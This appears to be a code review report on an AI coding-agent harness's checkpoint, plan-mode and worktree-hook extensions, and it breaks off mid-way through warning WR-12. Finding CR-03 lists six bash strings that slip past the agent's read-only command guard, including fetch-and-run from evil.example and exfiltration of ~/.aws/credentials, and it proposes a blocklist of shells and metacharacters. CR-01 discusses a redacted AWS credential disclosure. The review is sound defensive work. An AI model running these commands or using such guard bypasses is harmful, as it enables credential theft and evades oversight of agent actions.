---
phase: 07-composed-extensions-pinned-reviewed
reviewed: 2026-08-15T00:00:00Z
depth: standard
files_reviewed: 28
files_reviewed_list:
  - .gitignore
  - .pi/agents/planner.md
  - .pi/extensions/checkpoint/git.ts
  - .pi/extensions/checkpoint/index.ts
  - .pi/extensions/checkpoint/store.ts
  - .pi/extensions/loop-police/index.ts
  - .pi/extensions/loop-police/loop-police.ts
  - .pi/extensions/loop-police/PROVENANCE.md
  - .pi/extensions/plan-mode/index.ts
  - .pi/extensions/plan-mode/utils.ts
  - .pi/extensions/questionnaire.ts
  - .pi/extensions/todo.ts
  - .pi/scripts/worktree-setup-hook.mjs
  - .pi/settings.json
  - bin/bootstrap.sh
  - docs/EXTENSIONS.md
  - docs/RUNBOOK.md
  - tests/helpers/worktree.ts
  - tests/integration/git-checkpoint.test.ts
  - tests/integration/worktree-build.test.ts
  - tests/unit/contributing-boundary.test.ts
  - tests/unit/docs-policy.test.ts
  - tests/unit/extension-composition.test.ts
  - tests/unit/extension-pins.test.ts
  - tests/unit/subagent-agents-config.test.ts
  - tests/unit/subagent-capabilities.test.ts
  - tests/unit/tool-count-baseline.test.ts
  - tests/unit/vendor-license-audit.test.ts
  - tests/unit/workflow-budgets.test.ts
findings:
  critical: 4
  warning: 19
  info: 7
  total: 30
status: issues_found
---

# Phase 7: Code Review Report

**Reviewed:** 2026-08-15
**Depth:** standard
**Files Reviewed:** 28
**Status:** issues_found

## Summary

Phase 7 composes five pinned npm packages with five vendored extensions, adds a
worktree setup hook, a hardened checkpoint extension, and a large test surface.
The documentation discipline is unusually high and several tests (notably
`worktree-build.test.ts`'s parent-builds → worktree-fails → hook-fixes → worktree-builds
chain, and `git-checkpoint.test.ts` Cases 1–3) are genuinely strong, real-subprocess
proofs.

That is not the whole picture. Four defects rise to BLOCKER:

1. **A real AWS account ID, IAM user ARN, admin profile name, and a confirmation
   that plaintext long-lived admin keys sit on disk were committed to a public
   repository** — the exact thing CLAUDE.md's security posture forbids.
2. **`restoreCheckpoint` does not do what its contract says.** Verified by running
   git: it never removes files created after the checkpoint, so "restore the working
   tree to the checkpoint" produces a hybrid tree that never existed. The three
   restore tests are structurally arranged so this cannot show up.
3. **Plan mode's "read-only" bash allowlist is a regex string matcher that this
   review defeated six ways in one attempt**, including exfiltration of
   `~/.aws/credentials`. CLAUDE.md names this exact anti-pattern and mandates
   `unbash` instead. Nothing tests `isSafeCommand` at all.
4. **`git-checkpoint.test.ts` Case 5's "the shipped wiring actually reaches
   restoreCheckpoint" assertion is vacuous** — proven by mutation: gutting the command
   handler leaves the test green.

Findings 2 and 4 are the same failure shape this phase's review brief flags as the
highest-value thing to find. The hardening was written, argued at length in prose, and
the tests that "prove" it cannot fail for the property they name.

A further systemic gap: `merge_subagent_config()` writes into the developer's real
`~/.pi/agent/extensions/subagent/config.json`, and its only coverage is three source
greps that pass for an empty function body — while a mature harness for exactly this
(`templates-install.test.ts`, `PI_CODING_AGENT_DIR` redirection + stubbed `npm`)
already exists in this repo and was not used.

**Real bugs vs nits.** CR-01 through CR-04 and WR-01 through WR-15 are real defects
with concrete failure scenarios. WR-16 through WR-19 are correctness/documentation
drift in code that is live but whose trigger conditions are narrower. Everything under
`## Info` is a nit, an unreached edge, or editorial residue — flagged for cleanliness,
not because it breaks anything.

---

## Critical Issues

### CR-01: Real AWS account ID, IAM ARN and credential-location disclosure committed to a public repo

**File:** `docs/EXTENSIONS.md:347`, `docs/RUNBOOK.md:1006-1009`, `docs/RUNBOOK.md:1141-1146`

**Issue:** `docs/EXTENSIONS.md:347` is a tracked file in a repository CLAUDE.md
describes as "a public GitHub repo", and it contains verbatim:

```
Account <redacted>, arn:aws:iam::<redacted>:user/<redacted> — live,
long-lived static admin keys in plaintext at `~/.aws/credentials`, plus an SSO cache.
```

(The real account number, ARN and principal name stood in that line verbatim.
They have since been redacted from every tracked file, including this one — see
the CR-01 outcome at the end of this report and `RB-07-03` in `docs/RUNBOOK.md`.)

`docs/RUNBOOK.md` repeats the admin profile name and the claim that
long-lived static admin keys are present at `~/.aws/credentials` in two more places.

This publishes, together: the account number, the IAM principal name, the named
profile, and a public statement that that account's admin credentials exist as
plaintext static keys on a specific developer's laptop. None of that is a secret in
the "API key" sense, but jointly it is precise targeting information — the account ID
is the first thing needed for cross-account role enumeration and for
`sts:AssumeRole`/confused-deputy probing, and the "plaintext long-lived admin keys on
this laptop" line names the highest-value target on the machine. CLAUDE.md's
constraint is unqualified: *"Public repo. No credential may ever be committed.
Structure complete, values injected at runtime."* The spirit of that constraint —
never let real account state leak into tracked files — is broken here.

This is compounded by the fact that the finding being recorded is *correct and
important* (the install gate's pre-authorisation ground was falsified). The finding
must survive; the identifiers must not.

**Fix:** Redact the identifiers in the tracked docs; keep the finding and its force.
The planning artifacts under `.planning/` carry the same strings and need the same
treatment if they are pushed.

```markdown
| (a) | "This dev machine has no credentials — no AWS SSO, no provider keys." | **FALSE.** `aws sts get-caller-identity` against the developer's default admin profile returned exit 0, resolving a live IAM admin principal for a production account, backed by long-lived static keys in plaintext on disk plus an SSO cache. The account number, principal name and profile name are deliberately not recorded here — this is a public repository. The blast radius the pre-authorisation assumed away is real and large. |
```

Then, because the strings are already in git history, treat this as a disclosure
event, not a typo: rotate that principal's access keys and re-scope it away
from long-lived admin keys before pushing anything further. Add the account number to
a secret-scanning denylist so a re-introduction fails CI (this repo already has
`tests/unit/gitignore-policy.test.ts` and `tests/unit/redact.test.ts` as the natural
homes for such an assertion).

---

### CR-02: `restoreCheckpoint` does not restore the working tree — it leaves every post-checkpoint file in place

**File:** `.pi/extensions/checkpoint/git.ts:166-182`, `.pi/extensions/checkpoint/index.ts:110`, `:148`

**Issue:** `restoreCheckpoint` runs `git restore --source=<sha> --worktree -- .`.
That command **overwrites paths that exist in the checkpoint tree and does nothing to
paths that do not**. It never deletes. Verified by execution against a real repo built
with this module's own capture sequence:

```
# checkpoint taken, THEN a new untracked file created, THEN restore
git restore --source=$CP --worktree -- .
a.txt   -> restored to checkpoint content   (correct)
after.txt -> STILL PRESENT                  (created after the checkpoint)
```

The docstring at `git.ts:167-168` says "Restore the working tree at `repoRoot` to the
content captured by the checkpoint commit `sha`", and `index.ts:142-145` offers the
user "Yes, restore code to that point". Neither is true. The user who forks back to a
checkpoint gets a tree that is the *union* of the checkpoint and everything the model
created afterwards — a state that never existed. Concretely: the model writes
`src/new-module.ts` and rewrites `src/app.ts` to import it; the user rewinds; `app.ts`
comes back without the import, `new-module.ts` stays. Worse, the user believes the
rewind happened and continues from a state that is silently inconsistent.

The three restore cases cannot catch this by construction:
- Case 1 (`:95`) `rmSync`s the untracked file **before** calling restore.
- Case 3 (`:173`) `rmSync`s the ignored directory **before** calling restore, then
  asserts it is still absent — which passes whether or not restore deletes anything.
- Case 5 (`:225`) uses `git checkout --` to revert, creating nothing new.

Every case removes the post-checkpoint state by hand and then asks restore to bring
back what the checkpoint holds. None asks restore to *remove* what the checkpoint does
not hold.

**Fix:** Either implement the stated contract, or change the contract and the UI text.
To implement it, clean the tree first and then restore, both scoped identically:

```ts
export function restoreCheckpoint(repoRoot: string, sha: string): void {
	// Remove tracked-in-checkpoint-absent paths and untracked-but-not-ignored
	// files created after the checkpoint. -d for directories; -x is deliberately
	// NOT passed, so gitignored paths stay, matching createCheckpoint's own
	// SCOPE BOUNDARY.
	run(repoRoot, ["clean", "-fd", "--", "."]);
	run(repoRoot, ["restore", `--source=${sha}`, "--worktree", "--", "."]);
}
```

`git clean -fd` is destructive, so this must be an explicit, documented decision, not
a silent change: gate it behind a `mode: "overlay" | "exact"` parameter if the
overlay behaviour is ever wanted. Then add the missing test case:

```ts
it("case 6 -- a file created AFTER the checkpoint is removed by restore", () => {
	const repo = trackedRepo("kypi-checkpoint-");
	commitFile(repo, "tracked.txt", "line1\n", "init");
	const sha = createCheckpoint(repo, "case6");
	writeFileSync(join(repo, "after.txt"), "created after the checkpoint\n", "utf-8");
	restoreCheckpoint(repo, sha);
	expect(
		existsSync(join(repo, "after.txt")),
		"restore claims to put the working tree BACK to the checkpoint -- a file that did not " +
			"exist at checkpoint time must not survive it",
	).toBe(false);
});
```

---

### CR-03: Plan mode's "read-only" bash allowlist is a regex string matcher and is trivially defeated

**File:** `.pi/extensions/plan-mode/utils.ts:12-106`, enforced at `.pi/extensions/plan-mode/index.ts:233-243`

**Issue:** `isSafeCommand()` classifies a raw bash string with two regex lists. Plan
mode tells the model (`index.ts:275-293`) "Bash is restricted to an allowlist of
read-only commands". It is not. Every one of the following was run through the shipped
predicate and **returned `true` (allowed)**:

```
ALLOWED   curl https://evil.example/x.sh | sh
ALLOWED   find . -exec sh -c 'curl -d @$HOME/.aws/credentials https://evil' \;
ALLOWED   awk 'BEGIN{system("whoami")}'
ALLOWED   cat /dev/null; python -c 'import os;os.system("id")'
ALLOWED   env bash -c 'echo pwned'
ALLOWED   echo hi | bash
```

The mechanism is exactly the one CLAUDE.md names and forbids:

> **String matching in the `tool_call` guard** — `g=push; git $g`, `bash -lc "..."`,
> `xargs`, heredocs all defeat it. → `unbash@4.0.10` — parse to AST, match resolved
> command nodes.

The SAFE patterns are anchored at `^\s*` only, so the *first word* decides
admissibility and everything after a `|`, `;`, `&&`, `$(...)`, `-exec` or an
interpreter's `-c` is unexamined. The DESTRUCTIVE list has no entry for `sh`, `bash`,
`python`, `perl`, `node -e`, `xargs`, `|`, `;`, `&&`, or backticks. The second bypass
above exfiltrates the very `~/.aws/credentials` file CR-01 establishes holds live
admin keys on this machine.

This file was vendored with the header claim "Unmodified apart from this header",
i.e. **zero hardening was applied** to a guard sitting in the tool-execution path, in
a repo whose entire safety posture is built on not doing this. `tests/unit/` contains
no test for `isSafeCommand` in any form; `utils.ts` is covered only by the
plan-mode directory line budget.

Mitigating context, stated honestly: `.pi/extensions/safety/` is a separate,
`unbash`-based layer and is the primary control; plan mode is an additional gate, and
the safety layer may block some of these independently. That does not rescue this
file — plan mode presents itself to the model as the boundary, and a boundary that
returns `true` for `curl … | sh` is worse than no boundary, because it licenses the
model to proceed.

**Fix:** Route plan mode's bash gate through the existing `unbash` classifier rather
than `utils.ts`'s regexes, and make the vendoring header say that this is a
deliberate, recorded deviation from the upstream example:

```ts
// .pi/extensions/plan-mode/index.ts
import { classifyCommand } from "../safety/unbash-ast.ts"; // the repo's own AST classifier

pi.on("tool_call", async (event) => {
	if (!planModeEnabled || event.toolName !== "bash") return;
	const command = event.input.command as string;
	// Resolve every command node in the parsed AST; a plan-mode allow requires
	// EVERY resolved node to be on the read-only allowlist, not just the first word.
	const verdict = classifyCommand(command, { mode: "plan" });
	if (verdict !== "allow") {
		return { block: true, reason: `Plan mode: ${verdict.reason}\nCommand: ${command}` };
	}
});
```

If that is too large for a fix pass, the minimum acceptable interim is to hard-block
any command containing a shell metacharacter (`| ; & $( ` << > &&`), any
`-exec`/`-execdir`/`-ok`, and any of `sh bash zsh python perl ruby node xargs env`
appearing anywhere in the string — and to add a test corpus file mirroring
`tests/fixtures/evasion-corpus.ts` for the plan-mode predicate specifically, with the
six strings above as its first six rows.

---

### CR-04: `git-checkpoint.test.ts` Case 5's headless-reachability assertion cannot fail

**File:** `tests/integration/git-checkpoint.test.ts:243-248`

**Issue:** The assertion that is supposed to prove the shipped command wiring reaches
`restoreCheckpoint` is:

```ts
expect(indexSource, "...").toMatch(/registerCommand\("checkpoint-restore"[\s\S]*restoreCheckpoint\(/);
```

`[\s\S]*` is greedy and unbounded, so it spans the entire rest of the file. There is a
second `restoreCheckpoint(` call at `index.ts:148`, inside the `session_before_fork`
handler, **below** the command registration. The regex is therefore satisfied by that
call regardless of what the command handler does.

Proven by mutation. Replacing the command handler's restore call with a "NOT
IMPLEMENTED" notify:

```
real file matches:                          true
mutation applied:                           true
mutated file STILL matches (test green):    true
mutated handler still calls restoreCheckpoint?  false
```

The test's own failure message says the assertion exists because "the
headless-reachability claim must cover the shipped wiring, not just the library
function". It does not cover the shipped wiring. Combined with WR-16 (the headless
`notify` is a no-op), the entire "defect 1 fix" for this extension rests on one
assertion that cannot fail and one that is a function-arity check (IN-03).

This is classified BLOCKER rather than WARNING because in this project a green test is
the acceptance evidence for a phase; an assertion that is structurally incapable of
failing for the property it names is a false completion signal, which is the specific
failure this phase's review exists to catch.

**Fix:** Bound the match to the command handler's own body, and add a real behavioural
test that drives the command rather than grepping source.

```ts
// Bounded: from the registration up to the first line that closes the registerCommand
// call at the same indentation, so a later restoreCheckpoint( in a different handler
// cannot satisfy it.
const handlerBody = /registerCommand\("checkpoint-restore",\s*\{[\s\S]*?\n\t\}\);/.exec(indexSource);
expect(handlerBody, "checkpoint-restore registration block not found").not.toBeNull();
expect(
	handlerBody![0],
	"the checkpoint-restore command's OWN handler must call restoreCheckpoint",
).toContain("restoreCheckpoint(");

// And the mutation guard that makes the above non-vacuous:
const gutted = indexSource.replace(/restoreCheckpoint\(ctx\.cwd, match\.sha\);/, "/* gutted */");
expect(
	/registerCommand\("checkpoint-restore",\s*\{[\s\S]*?\n\t\}\);/.exec(gutted)![0],
).not.toContain("restoreCheckpoint(");
```

Better still: exercise the command handler for real through a `fauxProvider` +
`SessionManager.inMemory()` session (the pattern CLAUDE.md documents as the "Session"
test layer) so the claim is proven by behaviour, not by regex over source text.

---

## Warnings

### WR-01: `merge_subagent_config()` writes to the developer's real agent directory and has no behavioural test

**File:** `bin/bootstrap.sh:867-906`; coverage at `tests/unit/extension-pins.test.ts:314-335`

**Issue:** This new function `mkdir -p`s and writes
`$PI_AGENT_DIR/extensions/subagent/config.json` — on a real run, the developer's own
`~/.pi/agent/...`. Its entire test coverage is three greps over the shell source:
`bootstrapSource.includes("merge_subagent_config() {")`, a regex that `run_full()`'s
body mentions the name, and that the hook path is tracked. All three pass if the
function body is `:`. None would catch a JSON corruption, a clobbered unrelated key,
a non-idempotent write, or a wrong path.

The function itself reads correctly on inspection (refuses non-object/invalid JSON,
replaces only the two `worktreeSetupHook*` keys, compares before writing so a second
run is byte-identical, tab-indented to match the package's own writer). The problem is
that nothing proves it, while `tests/integration/templates-install.test.ts` already
establishes the exact harness for this: fresh `PI_CODING_AGENT_DIR` under `os.tmpdir()`
+ `KYPI_SKIP_INSTALL=1` + stubbed `npm` on PATH, with the "two independent guards
against touching this machine" discipline stated in its own header.

**Fix:** Add cases to a bootstrap integration test using `makeBootstrapRepoCopy` +
`PI_CODING_AGENT_DIR` redirection: (a) absent file → created with both keys and a
trailing newline; (b) second run → "already current - unchanged", byte-identical file;
(c) pre-existing file with an unrelated key (`{"maxConcurrent":3}`) → key survives; (d)
pre-existing invalid JSON → exit non-zero, file untouched byte-for-byte; (e)
pre-existing JSON array → refused.

---

### WR-02: No staleness check or `--check-only` report for the wired worktree hook path

**File:** `bin/bootstrap.sh:867-906`, `bin/bootstrap.sh:1140-1154`

**Issue:** `install_safety_extension` has a paired `report_safety_extension`
(`:1053-1077`) that runs in `--check-only` and **fails loudly** when the stub points at
a target that no longer exists, with the reasoning stated inline: "a stale stub is
silently unguarded rather than loudly broken" (T-04-48). `merge_subagent_config` has no
equivalent. It writes an absolute path into a **user-scope, machine-wide** config; if
the ky-pi-agent clone is moved or deleted, every subagent worktree spawn on that
machine, in every repository, points at a nonexistent hook. Whether `pi-subagents`
fails loudly or silently degrades in that case is unknown to this repo and untested
(RB-07-01 leg 2 is OUTSTANDING). The identical hazard got a guard for the safety stub
and none here.

**Fix:** Add `report_subagent_config()` mirroring `report_safety_extension`, called
from `run_check_only()`:

```sh
report_subagent_config() {
	_sa_cfg="$PI_AGENT_DIR/extensions/subagent/config.json"
	if [ ! -f "$_sa_cfg" ]; then
		printf '  WARN worktree setup hook not wired: %s is absent\n' "$_sa_cfg"
		printf '       remedy: run bin/bootstrap.sh with no arguments to apply\n'
		return 0
	fi
	KYPI_SUBAGENT_CONFIG="$_sa_cfg" node -e '
const fs = require("node:fs");
const p = process.env.KYPI_SUBAGENT_CONFIG;
let obj; try { obj = JSON.parse(fs.readFileSync(p, "utf8")); } catch (e) {
  console.error("FATAL: " + p + " is not valid JSON. Refusing to trust it."); process.exit(1); }
const hook = obj && obj.worktreeSetupHook;
if (typeof hook !== "string" || hook === "") {
  console.error("FATAL: " + p + " carries no worktreeSetupHook. Re-run bin/bootstrap.sh."); process.exit(1); }
if (!fs.existsSync(hook)) {
  console.error("FATAL: " + p + " points at " + hook + ", which does not exist.");
  console.error("       The clone that wrote this was moved or deleted. Re-run bin/bootstrap.sh.");
  process.exit(1); }
console.log("  " + p + " -> " + hook + " (target exists)");
'
}
```

---

### WR-03: The hook is wired at machine scope and will copy any repository's `.env` into subagent worktrees

**File:** `bin/bootstrap.sh:847-855`, `.pi/scripts/worktree-setup-hook.mjs:195-207`

**Issue:** The function's own header states the consequence: "This config file is
written at USER (machine) scope and therefore applies to every repo the operator ever
runs Pi in on this machine." Combined with the hook's `.env` behaviour, that means:
running a worktree-isolated subagent in **any** repository on this machine now copies
that repository's `.env` — whatever it holds — into a fresh worktree directory that
`pi-subagents` places wherever it likes (commonly outside the repo). The absolute-path
rationale for machine scope is sound; the *secret-handling* consequence of applying
`.env` copying machine-wide is neither stated in the bootstrap header nor in
`docs/EXTENSIONS.md`'s "Worktree isolation — accepted residual" section, which records
only the `node_modules`-sharing residual (T-07-07) and the `.env`-not-shared rationale
(T-07-08).

**Fix:** Record it as a named residual alongside T-07-07/T-07-08 in
`docs/EXTENSIONS.md`, and constrain the copy: only copy `.env` when the payload's
`repoRoot` matches a repository the operator opted in for, or (simpler and safer) drop
the `.env` copy entirely and let the subagent inherit the parent's environment, which
is what most build steps actually need. If the copy stays, chmod the destination `0600`
explicitly rather than relying on `copyFileSync` mode propagation.

---

### WR-04: The worktree containment guard is a case-sensitive string comparison and is bypassable on Windows

**File:** `.pi/scripts/worktree-setup-hook.mjs:108-111`, `:156-165`

**Issue:** The header calls this "the one catastrophic failure mode here, and must be
impossible rather than merely unlikely (threat T-07-06)". The implementation is:

```js
function isAncestorOrEqual(a, b) {
	return a === b || b.startsWith(a + sep);
}
```

`path.resolve()` does not normalise drive-letter case, and Windows paths are
case-insensitive. `C:\repo` and `c:\repo` are the same directory and compare unequal,
so a `worktreePath` of `c:\Users\Admin\Documents\ky-pi-agent` against a `repoRoot` of
`C:\Users\Admin\Documents\ky-pi-agent` passes the guard and the hook then junctions and
copies **into the parent repository**. The same holds for 8.3 short names
(`C:\Users\ADMIN~1\...`) and for a `repoRoot` reached through a junction alias. Whether
`pi-subagents` ever produces mismatched casing is not something this repo controls, and
the guard's own stated bar is "impossible, not merely unlikely".

**Fix:** Compare canonicalised real paths, case-folded on Windows:

```js
import { realpathSync } from "node:fs";

function canonical(p) {
	let out = resolve(p);
	try { out = realpathSync.native(out); } catch { /* not yet on disk: resolve() only */ }
	return process.platform === "win32" ? out.toLowerCase() : out;
}

function isAncestorOrEqual(a, b) {
	const ca = canonical(a);
	const cb = canonical(b);
	return ca === cb || cb.startsWith(ca + sep);
}
```

---

### WR-05: The hook silently no-ops when `node_modules` is absent or already present

**File:** `.pi/scripts/worktree-setup-hook.mjs:179-193`

**Issue:**

```js
if (existsSync(nodeModulesSrc) && !existsSync(nodeModulesDst)) { ... junction ... }
```

Two silent skips, both contradicting the header's own rule ("a degraded worktree must
be visible, never silent"):

1. **`nodeModulesSrc` absent** — the parent repo has no `node_modules`. The hook exits
   0, reports `syntheticPaths: []`, and the subagent gets an unbuildable worktree with
   no diagnostic. This is the exact failure the whole hook exists to prevent, and it is
   indistinguishable on stdout from a successful no-op.
2. **`nodeModulesDst` already present** — the hook skips AND omits `node_modules` from
   `syntheticPaths`. `pi-subagents` then treats that directory as real worktree content
   and includes it in every diff/cleanup pass, which is the precise consequence the
   `syntheticPaths` contract exists to avoid.

**Fix:** Report both cases on stderr, and in case 2 still declare the path synthetic:

```js
if (!existsSync(nodeModulesSrc)) {
	console.error(
		`worktree-setup-hook: ${nodeModulesSrc} does not exist -- the parent repository has no ` +
			"installed dependencies, so this worktree will not be able to build. Run an install in " +
			"the parent and re-spawn.",
	);
} else if (existsSync(nodeModulesDst)) {
	console.error(`worktree-setup-hook: ${nodeModulesDst} already exists -- left as-is, declared synthetic`);
	syntheticPaths.push("node_modules");
} else {
	symlinkSync(nodeModulesSrc, nodeModulesDst, "junction");
	syntheticPaths.push("node_modules");
}
```

---

### WR-06: `fail()` reports `syntheticPaths: []` after the junction has already been created

**File:** `.pi/scripts/worktree-setup-hook.mjs:97-106`, `:195-207`

**Issue:** The `.env` copy runs after the `node_modules` junction. If `copyFileSync`
throws, `fail()` prints `{"syntheticPaths":[]}` — but the junction already exists on
disk. The header claims "It never emits a half-provisioned success"; it emits a
half-provisioned *failure* whose reported state is wrong. `pi-subagents` reads the
declared `syntheticPaths` for diff and cleanup, so the junction now appears in the
subagent's patch output and may be walked during cleanup.

**Fix:** Have `fail()` report what actually exists:

```js
function fail(reason, provisioned = []) {
	console.error(`worktree-setup-hook: ${reason}`);
	process.stdout.write(`${JSON.stringify({ syntheticPaths: provisioned })}\n`);
	process.exitCode = 1;
}
// ... at the .env failure site:
fail(`failed to copy .env into the worktree: ${msg}`, syntheticPaths);
```

---

### WR-07: `.env` is copied unconditionally and will overwrite a tracked `.env` in the worktree

**File:** `.pi/scripts/worktree-setup-hook.mjs:197-207`

**Issue:** `copyFileSync(envSrc, envDst)` runs whenever the parent has a `.env`, with
no check on the destination. This hook is wired at machine scope (WR-03), so it will
run in repositories this project has never seen. In a repository where `.env` is
**tracked** (bad practice, but common — a `.env` with only non-secret defaults), `git
worktree add` checks it out and the hook then silently overwrites the tracked file with
the parent's copy *and* declares it a `syntheticPath`, which `pi-subagents` removes
before every diff/cleanup pass. The subagent then works against a tracked file that has
been replaced and will be deleted.

**Fix:** Skip when the destination already exists, and skip when git reports the path
as tracked in the worktree:

```js
if (existsSync(envSrc) && !existsSync(envDst)) {
	copyFileSync(envSrc, envDst);
	syntheticPaths.push(".env");
} else if (existsSync(envDst)) {
	console.error("worktree-setup-hook: .env already present in the worktree -- left as-is, not declared synthetic");
}
```

---

### WR-08: The hook's fail-closed validation branches have zero test coverage

**File:** `tests/integration/worktree-build.test.ts` (whole file), against `.pi/scripts/worktree-setup-hook.mjs:130-173`

**Issue:** `worktree-build.test.ts` is a genuinely strong test of the happy path. It
covers exactly one hook invocation, with a valid payload. Not covered: non-object
stdin, malformed JSON, `version !== 1`, non-absolute or empty `repoRoot`/`worktreePath`,
a `worktreePath` that does not exist, and — most importantly — the containment guard at
`:159`, which the hook's own header calls "the one catastrophic failure mode". A
regression that deleted the `isAncestorOrEqual` check outright would keep the entire
suite green.

**Fix:** Add a table-driven case spawning the real hook per invalid payload, asserting
exit code 1, `{"syntheticPaths":[]}` on stdout, a non-empty stderr, and — for the
containment case — that no `node_modules` or `.env` appeared in the parent:

```ts
const REFUSALS = [
	{ label: "wrong version", payload: { version: 2, repoRoot, worktreePath } },
	{ label: "relative repoRoot", payload: { version: 1, repoRoot: "rel", worktreePath } },
	{ label: "worktreePath IS repoRoot", payload: { version: 1, repoRoot, worktreePath: repoRoot } },
	{ label: "worktreePath is an ANCESTOR of repoRoot", payload: { version: 1, repoRoot, worktreePath: dirname(repoRoot) } },
	{ label: "worktreePath does not exist", payload: { version: 1, repoRoot, worktreePath: join(tmpdir(), "kypi-nope-" + randomUUID()) } },
];
it.each(REFUSALS)("$label -> exit 1, empty syntheticPaths, nothing written", ({ payload }) => {
	const run = spawnSync(process.execPath, [HOOK_PATH], { encoding: "utf-8", input: JSON.stringify(payload) });
	expect(run.status, `must fail closed: ${run.stdout}`).toBe(1);
	expect(JSON.parse(run.stdout.trim())).toEqual({ syntheticPaths: [] });
	expect(run.stderr.trim().length, "a refusal must say why").toBeGreaterThan(0);
	expect(existsSync(join(repoRoot, ".env-copied-by-mistake"))).toBe(false);
});
```

---

### WR-09: `recordCheckpoint` loses updates under the exact concurrency its sibling module designs for

**File:** `.pi/extensions/checkpoint/store.ts:139-163`

**Issue:** `recordCheckpoint` is read-modify-write with no lock:

```ts
const entries = readStoreFile(file);   // read
entries.push(row);                      // modify
writeFileSync(tmp, ...); renameSync(tmp, file);  // write
```

`git.ts:118-121` explicitly designs for "two concurrent checkpoints — the main session
and a subagent's own turn" by giving each a uniquely-named scratch index. Those same
two processes both call `recordCheckpoint` into one shared file. Interleave read-A,
read-B, write-A, write-B and A's entry is gone. The module docstring at `:24-35`
argues carefully for atomic *readers* (correct — `renameSync` gives that) and never
addresses lost updates, so the concurrency claim reads as stronger than it is.

The consequence is not cosmetic: the lost entry is a checkpoint the user can never
restore, and its loss is silent (`recordCheckpoint` returns a path, so it looks
successful).

**Fix:** Serialise on an exclusive lock file in the same directory (O_EXCL create,
bounded retry, stale-lock break by mtime), or make the store append-only JSONL and have
`readCheckpoints` tolerate a torn trailing line — the latter matches
`.pi/lib/jsonl.ts`'s already-proven four-concurrent-process append and removes the
read-modify-write entirely:

```ts
export function recordCheckpoint(repoRoot: string, input: CheckpointRecordInput): string | undefined {
	try {
		const dir = stateDir(repoRoot);
		mkdirSync(dir, { recursive: true });
		const file = storePath(repoRoot); // now checkpoints.jsonl
		appendFileSync(file, JSON.stringify(row) + "\n", "utf-8"); // atomic for < PIPE_BUF lines
		return file;
	} catch { return undefined; }
}
```

---

### WR-10: The checkpoint index grows without bound and can outlive the git objects it names

**File:** `.pi/extensions/checkpoint/store.ts:139-176`, `.pi/extensions/checkpoint/git.ts:129-164`

**Issue:** Two coupled problems.

1. **Unbounded growth, no scoping.** One entry per `turn_start`, forever, in one file
   per repository, across every session. Nothing prunes. Nothing scopes by session id.
   The whole array is re-serialised on every turn (WR-09's read-modify-write), so cost
   grows with history, and `/checkpoint-restore` with no argument prints every entry
   ever recorded (IN-06).
2. **The referenced objects are prunable.** `createCheckpoint` produces commits via
   `commit-tree` with **no ref pointing at them** — stated proudly at `git.ts:130-133`
   ("never made reachable from any ref"). Unreachable objects are exactly what `git gc`
   prunes. `git gc --prune=now`, a `git gc --aggressive`, or simply the default
   two-week grace period elapsing removes them. The store's entry survives; the object
   does not. `restoreCheckpoint` then fails with a raw git error, and the extension's
   headline claim — "a checkpoint recorded this turn is still findable and restorable
   next process" (`index.ts:39-41`) — is only true for a bounded window nobody
   documents.

**Fix:** Anchor the objects and bound the index. Anchoring is one extra git call:

```ts
// in createCheckpoint, after commit-tree:
const sha = run(repoRoot, ["commit-tree", tree, "-p", parent, "-m", label]).trim();
// A ref makes the object reachable, so `git gc` cannot prune it. refs/kypi-checkpoints/
// is outside refs/heads and refs/tags, so it never appears as a branch or tag and is
// never pushed by a default `git push`.
run(repoRoot, ["update-ref", `refs/kypi-checkpoints/${sha}`, sha]);
return sha;
```

Then add retention: keep the newest N (say 200) entries, and delete the corresponding
refs for the ones dropped. Document the retention number and where it is enforced.

---

### WR-11: `readCheckpoints` returns unvalidated data; a corrupt entry throws out of the command handler and the fork hook

**File:** `.pi/extensions/checkpoint/store.ts:119-129`, consumed at `.pi/extensions/checkpoint/index.ts:97-104`, `:122-127`

**Issue:** `readStoreFile` tolerates a missing file and unparseable JSON, but once
`JSON.parse` succeeds and the result is an array it casts blind:

```ts
return Array.isArray(parsed) ? (parsed as CheckpointEntry[]) : [];
```

A file containing `[1, 2, 3]`, `[null]`, or `[{"label":"x"}]` — reachable via a torn
concurrent write (WR-09), a partially-restored backup, or a hand edit — passes. Then
`index.ts:98` does `e.sha.slice(0, 12)` and `index.ts:104` does `e.sha.startsWith(...)`,
both of which throw `TypeError: Cannot read properties of undefined`. In the command
handler that surfaces as an unhandled rejection; in `session_before_fork` it throws out
of an event handler on a code path the user reached by asking to fork. The module
docstring's "NEVER THROWS" contract covers `recordCheckpoint` and `readCheckpoints` but
not their consumers, and the guarantee `readCheckpoints` actually provides is weaker
than the one its callers assume.

**Fix:** Validate per element and drop what does not conform:

```ts
function isCheckpointEntry(v: unknown): v is CheckpointEntry {
	if (v === null || typeof v !== "object") return false;
	const e = v as Record<string, unknown>;
	return typeof e.sha === "string" && e.sha !== ""
		&& typeof e.label === "string"
		&& typeof e.cwd === "string"
		&& typeof e.ts === "number"
		&& (e.entryId === undefined || typeof e.entryId === "string");
}

const parsed: unknown = JSON.parse(readFileSync(file, "utf-8"));
return Array.isArray(parsed) ? parsed.filter(isCheckpointEntry) : [];
```

Add a test that a store file of `[1,2,3]` yields `[]` and that
`/checkpoint-restore` on it notifies "no checkpoints recorded yet" instead of throwing.

---

### WR-12: The fork handler picks the NEWEST checkpoint sharing an entry id, which can be newer than the fork point

**File:** `.pi/extensions/checkpoint/index.ts:69-83`, `:118-128`

**Issue:** `currentEntryId` is updated only on `tool_result` (`:69-72`), and the
checkpoint is recorded at `turn_start` (`:74-83`). Two or more turns with no tool calls
in between therefore record multiple checkpoints under the **same** `entryId`. The fork
handler scans backwards and takes the last match:

```ts
for (let i = entries.length - 1; i >= 0; i--) {
	if (entries[i]?.entryId === event.entryId) { match = entries[i]; break; }
}
```

"Most recent checkpoint recorded for this entry id" is the wrong selector for a rewind.
Forking *at* entry E should restore the tree as it stood at E — the **earliest**
checkpoint recorded after E, not the latest. Concretely: a tool call ends turn 1
creating entry E; turns 2–5 are text-only, and the user edits files between them;
forking at E restores the state captured at the start of turn 5, which includes every
change the user made after E. The user asked to rewind and got a newer snapshot
overwriting their current tree — and, per CR-02, the post-checkpoint files stay too,
so the resulting tree corresponds to no point in history at all.

**Fix:** Select the first (oldest) checkpoint recorded on or after the fork point, and
scope by session. Minimally:

```ts
// Oldest checkpoint recorded for this entry id -- the tree as it stood when this
// entry was current, not the tree at the start of some later turn.
const match = entries.find((e) => e.entryId === event.entryId);
```

Long-term, record `entryId` at `turn_start` from `ctx.sessionManager.getLeafId()`
